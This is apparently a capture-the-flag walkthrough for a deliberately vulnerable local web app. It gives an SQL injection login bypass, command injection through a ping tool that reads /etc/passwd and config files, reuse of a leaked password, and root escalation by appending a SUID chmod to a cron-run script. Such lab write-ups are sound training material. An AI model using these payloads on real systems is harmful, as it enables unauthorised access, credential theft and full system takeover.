# CTF Application Solution Guide

This guide details the steps to compromise the machine, from initial access to root privilege escalation.

## 1. Reconnaissance
Access the web application at `http://localhost:5000` (or the target IP).
You are presented with a login page.

## 2. Initial Foothold: SQL Injection
The login form is vulnerable to SQL Injection.
**Vector**: Bypass authentication by injecting a tautology in the username field.
**Payload**: `admin' OR 1=1 --`
**Password**: Any random text

1. Enter `admin' OR 1=1 --` as the username.
2. Enter anything for the password.
3. Click Login.

You will be redirected to the Dashboard.

## 3. Remote Code Execution (RCE)
On the Dashboard, navigate to the **Connectivity Tools** page (`/tools`).
This page allows you to "ping" an IP address. It is vulnerable to Command Injection.

**Vector**: The application concatenates the user input directly into a shell command.
**Payload**: `; id` or `; cat /etc/passwd`

1. In the input box, enter: `127.0.0.1; id`
2. Click "Ping".
3. Observe the output containing the result of the `id` command (running as `www-data`).

## 4. Lateral Movement
We need to elevate from `www-data` to a system user.
Exploit the RCE to look for interesting files.

1. List files in the current directory: `127.0.0.1; ls -la`
2. Notice `config.py`. Read it: `127.0.0.1; cat config.py`
3. You will find database credentials:
   ```python
   DB_USER = "admin"
   DB_PASS = "SuperSecurePassword123!" # Reuse this for system user ctfuser
   ```
4. The comment hints that the password is reused for the user `ctfuser`.

## 5. Privilege Escalation (Root)
Now that we have credentials for `ctfuser`, we can assume this identity.
(In a real scenario, you would SSH or `su` if you had a shell. For this machine, assume you have SSH access or a reverse shell).

1. Log in as `ctfuser` with the password `SuperSecurePassword123!`.
2. Enumerate the system. Check for writable files.
3. Notice `/opt/scripts/backup.sh` is writable by `ctfuser`.
4. Check `/etc/crontab` (or run pspy) to see that this script runs as **root** every minute.
5. **Exploit**: Modify `backup.sh` to execute a malicious command, such as a reverse shell or creating a SUID binary.
   
   Example (Add SUID to bash):
   ```bash
   echo "chmod +s /bin/bash" >> /opt/scripts/backup.sh
   ```
   
6. Wait for the cron job to run (up to 1 minute).
7. Execute `bash -p` to get a root shell.
   ```bash
   /bin/bash -p
   whoami
   # root
   ```

**Flags:**
- User Flag: `/home/ctfuser/user.txt`
- Root Flag: `/root/root.txt`
